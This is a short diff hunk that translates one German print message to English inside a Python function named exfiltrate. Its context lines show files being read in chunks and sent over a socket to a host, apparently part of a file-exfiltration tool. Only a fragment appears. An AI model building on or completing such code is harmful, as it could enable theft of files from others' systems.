@@ -16,5 +16,5 @@ def exfiltrate(host_ip, files, path):
             sock.send(data)
             data = file.read(1024)
             
-        print("[i] {} ist leer".format(file))
+        print("[i] {} is empty".format(file))
         sock.close()
